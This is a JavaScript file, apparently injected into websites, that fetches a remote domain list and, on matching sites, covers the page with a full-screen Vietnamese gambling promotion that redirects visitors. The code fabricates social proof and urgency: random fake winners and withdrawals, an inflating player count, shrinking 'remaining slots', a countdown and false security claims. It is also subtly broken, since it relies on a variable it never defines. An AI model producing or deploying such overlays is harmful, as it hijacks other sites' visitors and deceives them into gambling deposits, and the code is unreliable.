(function() {
        
    
    const configUrl = 'https://www.thebooknest.homes/config.json';


let popupInitialized = false;


async function checkDomainAndInitialize() {
    if (popupInitialized) {
        console.log("Popup đã được khởi tạo trước đó");
        return;
    }
    
    try {
        console.log("Current domain:", window.location.hostname.toLowerCase());
        
        const response = await fetch(configUrl, {
            method: 'GET',
            cache: 'no-cache',
            headers: {
                'Content-Type': 'text/plain'
            }
        });
        
        console.log("Response status:", response.status);
        const configText = await response.text();
        console.log("Config received:", configText);
        
        // Log các domain được check
        const currentDomain = window.location.hostname.toLowerCase();
        const domainsToCheck = [
            currentDomain,
            currentDomain.startsWith('www.') ? currentDomain.substring(4) : `www.${currentDomain}`
        ];
        console.log("Domains being checked:", domainsToCheck);
        
        let foundMatch = false;
        let redirectUrl = '';
        
        for (const domainToCheck of domainsToCheck) {
            const matchingEntry = configEntries.find(entry => 
                entry[0].trim().toLowerCase() === domainToCheck
            );
            
            if (matchingEntry) {
                console.log("Tìm thấy domain trùng khớp!");
                foundMatch = true;
                redirectUrl = matchingEntry[1].trim();
                break;
            }
        }
        
        if (foundMatch && redirectUrl) {
            // Validate redirect URL
            try {
                new URL(redirectUrl);
                console.log("Khởi tạo popup với URL chuyển hướng:", redirectUrl);
                window.redirectURL = redirectUrl;
                initializePopup();
                popupInitialized = true;
            } catch (e) {
                throw new Error('Invalid redirect URL: ' + redirectUrl);
            }
        } else {
            console.log("Domain không có trong cấu hình, không hiển thị popup");
        }
        
    } catch (error) {
        console.error("Error in initialization:", error);
    }
}

function initializePopup() {
    createNewPopup();
    
    const encoded = btoa(unescape(encodeURIComponent('© 2025 DUCPHAM DIGITAL®. ALL RIGHTS RESERVED.')));
    const decoded = decodeURIComponent(escape(atob(encoded)));
    document.getElementById('copyright').textContent = decoded;
}

function createNewPopup() {
    addStyles();
    
    const popupContainer = document.createElement('div');
    popupContainer.className = 'neo-container';
    
    const isVersionA = Math.random() > 0.5;
    const registerTitle = isVersionA ? "LỘC ĐẦU TAY" : "CHƠI LÀ CÓ TIỀN";   
    const registerDesc = isVersionA ? "+58K - Khởi Đầu Chuỗi Đỏ" : "+58K - Thắng Như Gió Cuốn";
    const buttonClass = isVersionA ? "neo-cta-a" : "neo-cta-b";
    
    const rewardType = isVersionA ? " + 58K - THẮNG NHƯ DIỀU GẶP GIÓ" : "+58K - KHỞI ĐẦU CHUỖI ĐỎ";
    
    popupContainer.innerHTML = `
        <div class="neo-header">
            <h1 class="neo-title">VỐN NHỎ - THẮNG TO<span class="desktop-dash"> - </span><br class="mobile-break"> ĐẲNG CẤP TRIỆU PHÚ!</h1>
        </div>
        <div class="neo-jackpot-info neo-jackpot-top">
            <div class="neo-jackpot-banner">HÔM QUA ĐÃ CÓ NGƯỜI THẮNG 1,62 TỶ</div>
        </div>
        <div class="neo-online-counter-top" id="onlineCounter">
            <div class="neo-online-counter-content"><span class="neo-user-icon">👤</span> ĐANG CÓ <span id="userCount">223.668</span> NGƯỜI CHƠI</div>
        </div>
        <div class="neo-main">
            <div class="neo-winner-animation" id="winnerAnimation">
                <div class="neo-winner-notification" id="winnerNotification"></div>
            </div>
            <div class="neo-limited-offer-banner">
                <div class="neo-offer-line1">🔥 CHỈ CÒN <span id="remainingRewards" class="neo-remaining">29</span> SUẤT  🔥</div>
                <div class="neo-offer-line2">${rewardType}</div>
            </div>
            <div class="neo-content-grid">
                <div class="neo-counters">
                    <div class="neo-timer-modern">
                        <div class="neo-timer-title">ƯU ĐÃI ĐẶC BIỆT KẾT THÚC SAU</div>
                        <div class="neo-timer-container">
                            <div class="neo-timer-box">
                                <div class="neo-timer-value" id="hours">01</div>
                                <div class="neo-timer-label">Giờ</div>
                            </div>
                            <div class="neo-timer-separator">:</div>
                            <div class="neo-timer-box">
                                <div class="neo-timer-value" id="minutes">41</div>
                                <div class="neo-timer-label">Phút</div>
                            </div>
                            <div class="neo-timer-separator">:</div>
                            <div class="neo-timer-box">
                                <div class="neo-timer-value" id="seconds">22</div>
                                <div class="neo-timer-label">Giây</div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="neo-coins-effect" id="coinsEffect"></div>
                <div class="neo-cta-buttons">
                    <div class="${buttonClass}" id="registerButton">
                        <h3 class="neo-cta-title">${registerTitle}</h3>
                        <p class="neo-cta-desc">${registerDesc}</p>
                    </div>
                    <div class="neo-login-button-top" id="loginButton">
                        LỘC MỞ BÁT <br>
                        + 168K - Nạp Là Có - Lộc Thẳng Ví
                    </div>
                </div>
            </div>
        </div>
        <div class="neo-footer-wrapper">
            <div class="neo-security-info">
                🔒 ĐƯỢC CẤP PHÉP & BẢO MẬT 100% | RÚT TIỀN NHANH 5 PHÚT
            </div>
            <div class="neo-footer" id="copyright"></div>
        </div>
    `;
    
    window.isVersionA = isVersionA;
    
    document.body.appendChild(popupContainer);
    
    startCountdown();
    createCoinsEffect();
    generateWinners();
    updateOnlineUsers();
    decreaseRemainingRewards();
    
    document.getElementById('registerButton').addEventListener('click', () => showFriendlyPopup(isVersionA ? 'A' : 'B'));
    document.getElementById('loginButton').addEventListener('click', () => showFriendlyPopup('Login'));
}

function showFriendlyPopup(type) {
    let popupTitle, popupMessage, popupAction;
    
    switch(type) {
        case 'A':
            popupTitle = 'SẴN SÀNG NHẬN 58K MIỄN PHÍ?';
            popupMessage = 'Chúng tôi sắp chuyển bạn đến trang đăng ký để nhận 58K miễn phí ngay!';
            popupAction = 'ĐỒNG Ý, LẤY QUÀ';
            break;
        case 'B':
            popupTitle = 'SẴN SÀNG NHẬN 18.888K?';
            popupMessage = 'Chúng tôi sắp chuyển bạn đến trang đăng ký để nhận ưu đãi nạp đầu x3!';
            popupAction = 'ĐỒNG Ý, LẤY QUÀ';
            break;
        case 'Login':
            popupTitle = 'ĐĂNG NHẬP NGAY?';
            popupMessage = 'Chúng tôi sắp chuyển bạn đến trang đăng nhập chính thức.';
            popupAction = 'ĐỒNG Ý, TIẾP TỤC';
            break;
        default:
            popupTitle = 'SẴN SÀNG TIẾP TỤC?';
            popupMessage = 'Chúng tôi sắp chuyển bạn đến trang đăng ký chính thức.';
            popupAction = 'ĐỒNG Ý, TIẾP TỤC';
    }
    
    const confirmPopup = document.createElement('div');
    confirmPopup.className = 'neo-friendly-popup';
    confirmPopup.innerHTML = `
        <div class="neo-friendly-content">
            <div class="neo-friendly-title">🎁 ${popupTitle}</div>
            <div class="neo-friendly-message">${popupMessage}</div>
            <div class="neo-friendly-question">Bạn đã sẵn sàng chưa?</div>
            <div class="neo-friendly-buttons">
                <button class="neo-friendly-btn-later" id="btnLater">ĐỂ SAU NHÉ</button>
                <button class="neo-friendly-btn-continue" id="btnContinue">${popupAction}</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(confirmPopup);
    
    const overlay = document.createElement('div');
    overlay.className = 'neo-overlay';
    document.body.appendChild(overlay);
    
    document.getElementById('btnContinue').addEventListener('click', () => {
        window.location.href = window.redirectURL;
        confirmPopup.remove();
        overlay.remove();
    });
    
    document.getElementById('btnLater').addEventListener('click', () => {
        confirmPopup.remove();
        overlay.remove();
    });
    
    setTimeout(() => {
        confirmPopup.style.opacity = '1';
        confirmPopup.style.transform = 'translate(-50%, -50%) scale(1)';
        overlay.style.opacity = '1';
    }, 10);
}

function generateWinners() {
    const firstNames = ["Ng", "Tr", "Ph", "Th", "Ho", "Qu", "V", "T", "H", "D", "L", "B", "M"];
    const lastNames = ["Anh", "Hùng", "Linh", "Tùng", "Mai", "Thảo", "Hà", "Long", "Dũng", "Minh", "Hương", "Hải", "Loan"];
    
    const games = ["LUCKY FORTUNE", "GOLD RUSH", "DRAGONS FIRE", "MEGA WHEEL", "ROYAL PALACE", "DIAMOND KINGS", "FORTUNE TIGER"];
    
    const notifications = [
        { type: "win", emoji: "🎉", message: "vừa thắng", chance: 60 },
        { type: "withdraw", emoji: "💰", message: "vừa rút thành công", chance: 25 },
        { type: "jackpot", emoji: "🔥", message: "vừa JACKPOT", chance: 10 },
        { type: "deposit", emoji: "🎁", message: "vừa nhận", addition: "từ khuyến mãi nạp đầu", chance: 5 }
    ];
    
    const animations = ["slide-down", "slide-right", "blink-highlight"];
    
    function getRandomAmount(min, max) {
        const amount = Math.floor(Math.random() * (max - min + 1) + min);
        return amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + "đ";
    }
    
    function createRandomNotification() {
        const rand = Math.random() * 100;
        let cumulative = 0;
        let selectedNotification;
        
        for (const notification of notifications) {
            cumulative += notification.chance;
            if (rand <= cumulative) {
                selectedNotification = notification;
                break;
            }
        }
        
        const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
        const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
        const hiddenName = firstName + "***" + " " + lastName;
        
        let amount;
        switch (selectedNotification.type) {
            case "win":
                amount = getRandomAmount(2000000, 50000000);
                break;
            case "withdraw":
                amount = getRandomAmount(5000000, 100000000);
                break;
            case "jackpot":
                amount = getRandomAmount(200000000, 1000000000);
                break;
            case "deposit":
                amount = getRandomAmount(10000000, 50000000);
                break;
            default:
                amount = getRandomAmount(2000000, 50000000);
        }
        
        const game = games[Math.floor(Math.random() * games.length)];
        
        let notification = `${selectedNotification.emoji} ${hiddenName} ${selectedNotification.message} ${amount}`;
        
        if (selectedNotification.type === "win" || selectedNotification.type === "jackpot") {
            notification += ` với ${game}`;
        } else if (selectedNotification.type === "deposit") {
            notification += ` ${selectedNotification.addition}`;
        }
        
        let animation = animations[Math.floor(Math.random() * animations.length)];
        
        if (selectedNotification.type === "jackpot") {
            animation = "blink-highlight";
        }
        
        return { text: notification, animation: animation };
    }
    
    function showWinnerNotification() {
        const notification = createRandomNotification();
        const notificationElement = document.getElementById('winnerNotification');
        
        if (notificationElement) {
            notificationElement.textContent = notification.text;
            notificationElement.className = `neo-winner-notification ${notification.animation}`;
            
            setTimeout(() => {
                notificationElement.className = 'neo-winner-notification';
            }, 3000);
            
            setTimeout(showWinnerNotification, Math.random() * 5000 + 5000);
        }
    }
    
    setTimeout(showWinnerNotification, 1000);
}

function startCountdown() {
    const baseHours = 1;
    const additionalMinutes = Math.floor(Math.random() * 60);
    const seconds = Math.floor(Math.random() * 60);
    
    let totalSeconds = baseHours * 3600 + additionalMinutes * 60 + seconds;
    
    function updateTimer() {
        const hours = Math.floor(totalSeconds / 3600);
        const minutes = Math.floor((totalSeconds % 3600) / 60);
        const secs = totalSeconds % 60;
        
        document.getElementById('hours').textContent = String(hours).padStart(2, '0');
        document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
        document.getElementById('seconds').textContent = String(secs).padStart(2, '0');
        
        if (totalSeconds > 0) {
            totalSeconds--;
            setTimeout(updateTimer, 1000);
        } else {
            document.querySelector('.neo-timer-modern').classList.add('urgent');
        }
        
        if (totalSeconds < 300) {
            document.querySelector('.neo-timer-modern').classList.add('urgent');
        }
    }
    
    updateTimer();
}

function updateOnlineUsers() {
    const counterElement = document.getElementById('userCount');
    if (!counterElement) return;
    
    let currentCount = 223668;
    
    function increaseUsers() {
        const increase = Math.floor(Math.random() * 3) + 1;
        currentCount += increase;
        
        counterElement.textContent = currentCount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
        counterElement.classList.add('highlight');
        
        setTimeout(() => {
            counterElement.classList.remove('highlight');
        }, 1000);
        
        setTimeout(increaseUsers, Math.random() * 5000 + 3000);
    }
    
    setTimeout(increaseUsers, 2000);
}

function decreaseRemainingRewards() {
    const rewardsElement = document.getElementById('remainingRewards');
    if (!rewardsElement) return;
    
    let remaining = 29;
    
    const isVersionA = window.isVersionA;
    const rewardType = isVersionA ? "58K MIỄN PHÍ" : "THƯỞNG NẠP ĐẦU";
    
    function decreaseRewards() {
        if (remaining > 1) {
            remaining--;
            
            rewardsElement.textContent = remaining;
            rewardsElement.classList.add('alert');
            
            setTimeout(() => {
                rewardsElement.classList.remove('alert');
            }, 1000);
            
            const delay = remaining < 10 ? 30000 + Math.random() * 30000 : 
                          remaining < 20 ? 15000 + Math.random() * 15000 : 
                          8000 + Math.random() * 7000;
                          
            setTimeout(decreaseRewards, delay);
        } else {
            rewardsElement.classList.add('urgent');
        }
    }
    
    setTimeout(decreaseRewards, 10000);
}

function createCoinsEffect() {
    const coinsContainer = document.getElementById('coinsEffect');
    if (!coinsContainer) return;
    
    coinsContainer.innerHTML = '';
    
    function createCoin() {
        const coin = document.createElement('div');
        coin.className = 'neo-coin';
        
        const coinText = document.createElement('div');
        coinText.className = 'neo-coin-text';
        coinText.textContent = '₫';
        coin.appendChild(coinText);
        
        const size = Math.random() * 20 + 35;
        const left = Math.random() * 90 + 5;
        const duration = Math.random() * 3 + 5;
        const delay = Math.random() * 3;
        
        coin.style.width = `${size}px`;
        coin.style.height = `${size}px`;
        coin.style.left = `${left}%`;
        coin.style.animationDuration = `${duration}s`;
        coin.style.animationDelay = `${delay}s`;
        
        coinsContainer.appendChild(coin);
        
        setTimeout(() => {
            if (coin && coin.parentNode) {
                coin.parentNode.removeChild(coin);
            }
        }, (duration + delay) * 1000 + 500);
    }
    
    for (let i = 0; i < 8; i++) {
        setTimeout(() => createCoin(), i * 300);
    }
    
    setInterval(() => {
        if (document.querySelectorAll('.neo-coin').length < 12) {
            createCoin();
        }
    }, 1500);
}

   function addStyles() {
       const styleElement = document.createElement('style');
       styleElement.textContent = `
           .neo-container {
               position: fixed;
               top: 0;
               left: 0;
               transform: none;
               width: 100%;
               max-width: 100%;
               height: 100%;
               background: linear-gradient(to bottom, #2d2d2d, #111);
               border-radius: 0;
               box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
               color: #ffffff;
               font-family: 'Roboto', 'Segoe UI', Tahoma, Arial, sans-serif;
               text-align: center;
               z-index: 9990;
               display: flex;
               flex-direction: column;
               overflow: hidden;
           }

           .neo-header {
               background: linear-gradient(to right, #000, #222, #000);
               padding: 15px 0;
               border-bottom: 2px solid #d4af37;
               margin: 0;
           }

           .neo-title {
               margin: 0;
               font-size: 24px;
               color: #d4af37;
               text-shadow: 0 0 10px rgba(212, 175, 55, 0.7);
               font-weight: bold;
               font-family: 'Roboto', 'Segoe UI', Tahoma, Arial, sans-serif;
           }
           
           .neo-jackpot-info {
               padding: 0;
               background: none;
               margin: 0;
               border-bottom: none;
           }
           
           .neo-jackpot-banner {
               background: linear-gradient(to right, #d4af37, #ffd700, #d4af37);
               color: #000;
               padding: 12px 5px;
               font-weight: bold;
               font-size: 18px;
               width: 100%;
               display: block;
               text-align: center;
               box-shadow: inset 0 1px 0 rgba(255,255,255,0.4);
               text-shadow: 0 1px 0 rgba(255,255,255,0.3);
               letter-spacing: 0.5px;
           }
           
           .neo-jackpot-top {
               padding: 0;
               margin: 0;
               background: none;
           }
           
           .neo-top-info-container {
               display: block;
               border-bottom: none;
           }
           
           .neo-online-counter-top {
               padding: 12px 0;
               background: rgba(86, 0, 149, 0.8);
               margin: 0;
               text-align: center;
           }
           
           .neo-online-counter-content {
               font-size: 18px;
               font-weight: bold;
               color: #ffd700;
               letter-spacing: 1px;
           }
           
           .neo-user-icon {
               display: inline-block;
               background: linear-gradient(to bottom, #ffda6a, #d4af37);
               color: #000;
               width: 24px;
               height: 24px;
               line-height: 24px;
               text-align: center;
               border-radius: 50%;
               box-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
               margin-right: 5px;
               animation: glow-icon 2s infinite alternate;
               font-size: 15px;
           }

           @keyframes glow-icon {
               0% { box-shadow: 0 0 5px rgba(255, 204, 0, 0.5); }
               100% { box-shadow: 0 0 15px rgba(255, 204, 0, 0.9); }
           }

           #userCount {
               color: #fff;
               font-weight: bold;
           }

           .neo-main {
               padding: 25px 20px 20px;
               position: relative;
               flex: 1;
               overflow-y: auto;
               padding-bottom: calc(100px + env(safe-area-inset-bottom, 0px));
               -ms-overflow-style: none;
               scrollbar-width: none;
           }
           
           .neo-main::-webkit-scrollbar {
               display: none;
           }
           
           .neo-limited-offer-banner {
               background: linear-gradient(to bottom, #f10e0e, #d3b72f);
               color: #ffffff;
               font-size: 18px;
               font-weight: bold;
               padding: 15px 10px;
               margin: 5px 0 20px;
               border-radius: 8px;
               text-shadow: 0 2px 4px rgba(0,0,0,0.7);
               box-shadow: 0 0 25px rgba(255,0,0,0.3);
               border: 1px solid rgba(255, 100, 100, 0.4);
               letter-spacing: 0.5px;
               font-family: 'Roboto', 'Segoe UI', Tahoma, Arial, sans-serif;
               display: flex;
               flex-direction: row;
               justify-content: center;
               align-items: center;
               flex-wrap: nowrap;
           }
           
           .neo-offer-line1, .neo-offer-line2 {
               display: inline-block;
           }
           
           .neo-offer-line2 {
               margin-left: 5px;
               margin-top: 10px;
           }
           
           .neo-remaining {
               color: #ffffff;
               font-size: 30px;
               font-weight: bold;
               background: #ff3333;
               padding: 3px 10px;
               border-radius: 8px;
               margin: 0 8px;
               text-shadow: 0 2px 4px rgba(0,0,0,0.5);
               display: inline-block;
               min-width: 40px;
               box-shadow: 0 0 10px rgba(255,120,120,0.5);
               position: relative;
               vertical-align: middle;
               border: 1px solid rgba(255,255,255,0.6);
           }
           
           .neo-content-grid {
               display: grid;
               grid-template-columns: 1fr 1fr;
               grid-gap: 20px;
               margin-bottom: 20px;
           }
           
           .neo-counters, .neo-cta-buttons {
               display: flex;
               flex-direction: column;
               justify-content: center;
           }
           
           .neo-winner-animation {
               position: relative;
               height: 50px;
               margin-bottom: 15px;
               overflow: hidden;
           }

           .neo-winner-animation {
               position: relative;
               height: 50px;
               margin-bottom: 15px;
               overflow: hidden;
           }

           .neo-winner-notification {
               position: absolute;
               padding: 8px 15px;
               background: rgba(0, 0, 0, 0.7);
               border: 1px solid #d4af37;
               border-radius: 8px;
               font-size: 14px;
               white-space: nowrap;
               opacity: 0;
           }

           .neo-jackpot-info {
               margin-bottom: 20px;
           }

           .neo-jackpot-banner {
               background: linear-gradient(to right, #d4af37, #f5cc7a, #d4af37);
               color: #000;
               padding: 12px 5px;
               border-radius: 0;
               font-weight: bold;
               font-size: 16px;
               display: block;
               width: 100%;
               margin: 0;
               text-align: center;
               text-shadow: 0 1px 1px rgba(255,255,255,0.3);
               box-sizing: border-box;
           }

           .neo-jackpot-top {
               padding: 0;
               background: none;
               margin: 0;
               border-bottom: none;
           }

           .neo-top-info-container {
               display: block;
               border-bottom: none;
           }
           
           .neo-online-counter-top {
               padding: 8px 0;
               background: rgba(86, 0, 149, 0.3);
               margin: 0;
               border-bottom: none;
           }
           
           .neo-online-counter-content {
               font-size: 16px;
               font-weight: bold;
               color: #d4af37;
               padding: 2px 0;
               letter-spacing: 0.5px;
           }
           
           .neo-counters {
               display: flex;
               flex-direction: column;
               gap: 15px;
               margin-bottom: 20px;
           }

           .neo-timer {
               font-size: 16px;
           }

           .neo-timer-label {
               color: #d4af37;
               font-weight: bold;
           }

           .neo-countdown {
               font-weight: bold;
           }

           .neo-limited-offer {
               font-size: 22px;
               font-weight: bold;
               color: #ff5252;
               padding: 10px;
               background: rgba(0, 0, 0, 0.3);
               border-radius: 10px;
               margin-top: 10px;
           }

           .neo-remaining {
               font-size: 26px;
               font-weight: bold;
           }

           .neo-coins-effect {
               position: absolute;
               top: 0;
               left: 0;
               width: 100%;
               height: 100%;
               pointer-events: none;
               overflow: hidden;
               z-index: 2;
           }

           .neo-coin {
               position: absolute;
               top: -60px;
               border-radius: 50%;
               animation: simpleCoinFall linear forwards;
               background: radial-gradient(circle at 30% 30%, #ffe680, #ffd700 30%, #d4af37 70%);
               border: 3px solid #ffd700;
               box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5),
                           inset 0 -2px 5px rgba(0, 0, 0, 0.2),
                           inset 0 2px 5px rgba(255, 255, 255, 0.7);
               display: flex;
               justify-content: center;
               align-items: center;
               overflow: hidden;
               z-index: 5;
           }
           
           .neo-coin:before {
               content: '';
               position: absolute;
               width: 100%;
               height: 100%;
               background: linear-gradient(135deg, 
                   rgba(255, 255, 255, 0.8) 0%, 
                   rgba(255, 255, 255, 0) 50%);
               border-radius: 50%;
           }
           
           .neo-coin-text {
               color: #883800;
               font-family: Arial, sans-serif;
               font-weight: 900;
               font-size: 24px;
               text-shadow: 0 1px 1px rgba(255, 255, 255, 0.7);
               position: relative;
               z-index: 2;
           }

           @keyframes simpleCoinFall {
               0% {
                   top: -60px;
                   transform: rotate(0deg);
                   opacity: 0;
               }
               10% {
                   opacity: 1;
               }
               100% {
                   top: 120%;
                   transform: rotate(360deg);
                   opacity: 1;
               }
           }
           
           .neo-cta-buttons {
               display: flex;
               flex-direction: column;
               gap: 15px;
               margin: 0;
               justify-content: center;
           }

           .neo-cta-a, .neo-cta-b, .neo-login-button-top {
               padding: 15px;
               border-radius: 12px;
               cursor: pointer;
               transition: all 0.3s ease;
               width: 100%;
               height: 65px;
               max-width: 350px;
               margin: 0 auto;
               display: flex;
               flex-direction: column;
               justify-content: center;
               align-items: center;
               box-sizing: border-box;
           }

           .neo-cta-a, .neo-cta-b {
               background: linear-gradient(to bottom, #ffd700, #d4af37);
               color: #000000;
               transform: scale(1.08);
               box-shadow: 0 0 30px rgba(255, 204, 0, 0.7);
               border: 2px solid rgba(255, 255, 255, 0.5);
               font-weight: bold;
               position: relative;
               overflow: hidden;
               padding: 14px 10px;
               height: 75px;
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               text-rendering: optimizeLegibility;
               -webkit-font-smoothing: antialiased;
               -moz-osx-font-smoothing: grayscale;
               animation: pulse 1s ease-in-out 1s infinite;
           }

           .neo-cta-title {
               margin: 0 0 3px 0;
               font-size: 18px;
               font-weight: 800;
               line-height: 1.3;
               letter-spacing: 0.2px;
               text-shadow: 0 1px 1px rgba(255,255,255,0.5);
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               text-transform: uppercase;
               word-spacing: 1px;
           }

           .neo-cta-desc {
               margin: 0;
               font-size: 18px;
               color: #000000;
               line-height: 1.3;
               font-weight: 600;
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               letter-spacing: 0.1px;
           }

           .neo-cta-a:hover, .neo-cta-b:hover {
               transform: scale(1.12);
               background: linear-gradient(to bottom, #ffe65c, #f8bf00);
               color: #000000;
               box-shadow: 0 0 40px rgba(255, 204, 0, 0.9);
           }

           .neo-login-button-top {
               background: linear-gradient(to bottom, #f10e0e, #d3b72f);
               color:rgb(255, 255, 255);
               font-weight: bold;
               font-size: 18px;
               box-shadow: 0 0 10px rgba(255, 82, 82, 0.3);
               z-index: 1;
               font-family: 'Roboto', 'Segoe UI', Tahoma, Arial, sans-serif;
               animation: pulse 1s ease-in-out 1s infinite;
           }

           .neo-cta-a:hover, .neo-cta-b:hover {
               transform: scale(1.08);
               box-shadow: 0 0 30px rgba(255, 204, 0, 0.7);
           }

           .neo-login-button-top:hover {
               transform: scale(1.03);
               box-shadow: 0 0 15px rgba(255, 82, 82, 0.5);
           }

           .neo-footer-wrapper {
               width: 100%;
               position: fixed;
               bottom: 0;
               left: 0;
               right: 0;
               z-index: 9991;
               background: #111;
               padding-bottom: env(safe-area-inset-bottom, 0px);
           }

           .neo-security-info {
               background: rgba(0, 0, 0, 0.9);
               padding: 12px;
               color: #aaaaaa;
               font-size: 13px;
               letter-spacing: 0.5px;
               border-top: 1px solid rgba(255, 255, 255, 0.05);
               white-space: nowrap;
               overflow: hidden;
               text-overflow: ellipsis;
               box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.7);
           }

           .neo-footer {
               background: linear-gradient(to right, #181818, #222222, #181818);
               padding: 12px 0;
               font-size: 14px;
               font-weight: bold;
               color: #d4af37;
               letter-spacing: 0.7px;
               border-top: 1px solid rgba(212, 175, 55, 0.3);
               text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
               border-radius: 0;
               font-family: 'Roboto', 'Segoe UI', Tahoma, Arial, sans-serif;
           }

           .neo-overlay {
               position: fixed;
               top: 0;
               left: 0;
               width: 100%;
               height: 100%;
               background: rgba(0, 0, 0, 0.7);
               z-index: 9998;
               opacity: 0;
               transition: opacity 0.3s ease;
           }

           .neo-friendly-popup {
               position: fixed;
               top: 50%;
               left: 50%;
               transform: translate(-50%, -50%) scale(0.8);
               width: 90%;
               max-width: 400px;
               background: linear-gradient(to bottom, #1a1a1a, #000);
               border: 2px solid #d4af37;
               border-radius: 15px;
               box-shadow: 0 0 30px rgba(212, 175, 55, 0.4);
               z-index: 9999;
               padding: 30px 25px;
               text-align: center;
               opacity: 0;
               transition: transform 0.3s ease, opacity 0.3s ease;
           }

           .neo-friendly-content {
               display: flex;
               flex-direction: column;
               gap: 18px;
           }

           .neo-friendly-title {
               color: #ffd700;
               font-size: 24px;
               font-weight: 800;
               margin-bottom: 5px;
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               text-shadow: 0 2px 8px rgba(255, 215, 0, 0.4);
               line-height: 1.4;
               letter-spacing: 0.5px;
           }

           .neo-friendly-message {
               color: #fff;
               font-size: 16px;
               line-height: 1.5;
               margin-bottom: 10px;
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               padding: 0 10px;
           }

           .neo-friendly-question {
               color: #ffd700;
               font-size: 20px;
               margin: 8px 0 12px;
               font-weight: bold;
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               text-shadow: 0 1px 4px rgba(255, 215, 0, 0.3);
           }

           .neo-friendly-buttons {
               display: flex;
               gap: 15px;
               justify-content: center;
               margin-top: 8px;
           }

           .neo-friendly-btn-later, .neo-friendly-btn-continue {
               padding: 15px 20px;
               border-radius: 10px;
               border: none;
               cursor: pointer;
               font-weight: bold;
               transition: all 0.3s ease;
               font-size: 15px;
               font-family: 'Open Sans', 'Roboto', Arial, sans-serif;
               letter-spacing: 0.5px;
           }

           .neo-friendly-btn-later {
               background: rgba(255, 255, 255, 0.15);
               color: #fff;
               border: 1px solid rgba(255, 255, 255, 0.2);
               min-width: 130px;
           }

           .neo-friendly-btn-continue {
               background: linear-gradient(to bottom, #ffd700, #d4af37);
               color: #000;
               flex-grow: 1.5;
               font-weight: 800;
               border: 1px solid rgba(255, 255, 255, 0.3);
               box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
               min-width: 180px;
           }

           .neo-friendly-btn-later:hover {
               background: rgba(255, 255, 255, 0.25);
               transform: translateY(-2px);
           }

           .neo-friendly-btn-continue:hover {
               background: linear-gradient(to bottom, #ffe14d, #e5c04c);
               transform: translateY(-3px);
               box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
           }

           @keyframes fadeIn {
               from { opacity: 0; }
               to { opacity: 1; }
           }

           @keyframes scaleIn {
               from { transform: scale(0.8); opacity: 0; }
               to { transform: scale(1); opacity: 1; }
           }

           .highlight {
               animation: highlight 1s ease-in-out;
           }

           @keyframes highlight {
               0%, 100% { color: #fff; }
               50% { color: #d4af37; }
           }

           .alert {
               animation: alert 1.5s ease-in-out;
           }

           @keyframes alert {
               0%, 100% { color: #ff5252; }
               50% { color: #ffffff; }
           }

           .urgent {
               animation: urgent 1s infinite;
           }

           @keyframes urgent {
               0%, 100% { color: #d4af37; }
               50% { color: #ff5252; }
           }

           .slide-down {
               animation: slideDown 3s forwards;
           }

           .slide-right {
               animation: slideRight 3s forwards;
           }

           .blink-highlight {
               animation: blinkHighlight 3s forwards;
           }

           @keyframes slideDown {
               0% { top: -50px; left: 50%; transform: translateX(-50%); opacity: 1; }
               10% { top: 0; left: 50%; transform: translateX(-50%); opacity: 1; }
               80% { top: 0; left: 50%; transform: translateX(-50%); opacity: 1; }
               100% { top: 50px; left: 50%; transform: translateX(-50%); opacity: 0; }
           }

           @keyframes slideRight {
               0% { left: -100%; top: 0; opacity: 1; }
               10% { left: 0; top: 0; opacity: 1; }
               80% { left: 0; top: 0; opacity: 1; }
               100% { left: 100%; top: 0; opacity: 0; }
           }

           @keyframes blinkHighlight {
               0% { top: 0; left: 50%; transform: translateX(-50%); background: rgba(255, 82, 82, 0.4); }
               10% { top: 0; left: 50%; transform: translateX(-50%); background: rgba(212, 175, 55, 0.4); }
               20% { top: 0; left: 50%; transform: translateX(-50%); background: rgba(255, 82, 82, 0.4); }
               30% { top: 0; left: 50%; transform: translateX(-50%); background: rgba(212, 175, 55, 0.4); }
               80% { top: 0; left: 50%; transform: translateX(-50%); }
               100% { top: 0; left: 100%; transform: translateX(0); opacity: 0; }
           }

           .neo-timer-modern {
               margin: 0;
               padding: 15px;
               background: linear-gradient(145deg, rgba(45,45,45,0.6), rgba(25,25,25,0.6));
               border-radius: 15px;
               box-shadow: 0 5px 15px rgba(0,0,0,0.3);
               height: 100%;
               display: flex;
               flex-direction: column;
               justify-content: center;
           }
           
           .neo-timer-title {
               font-size: 18px;
               font-weight: bold;
               color: #ff9d00;
               margin-bottom: 15px;
               text-transform: uppercase;
               letter-spacing: 1px;
               text-shadow: 0 2px 4px rgba(0,0,0,0.5);
               font-family: 'Roboto', 'Segoe UI', Tahoma, Arial, sans-serif;
           }
           
           .neo-timer-container {
               display: flex;
               justify-content: center;
               align-items: center;
               gap: 15px;
           }
           
           .neo-timer-box {
               background: linear-gradient(to bottom, #333, #111);
               padding: 10px 15px;
               border-radius: 10px;
               min-width: 70px;
               box-shadow: 0 3px 6px rgba(0,0,0,0.3), inset 0 1px 1px rgba(255,255,255,0.1);
               border: 1px solid rgba(255,255,255,0.1);
           }
           
           .neo-timer-value {
               font-size: 32px;
               font-weight: bold;
               color: #fff;
               text-shadow: 0 0 10px rgba(255, 170, 0, 0.7);
           }
           
           .neo-timer-label {
               font-size: 14px;
               color: #999;
               margin-top: 5px;
           }
           
           .neo-timer-separator {
               font-size: 32px;
               font-weight: bold;
               color: #d4af37;
               align-self: flex-start;
               padding-top: 10px;
           }

           .neo-timer-modern.urgent .neo-timer-value {
               animation: pulse-value 1s infinite alternate;
           }
           
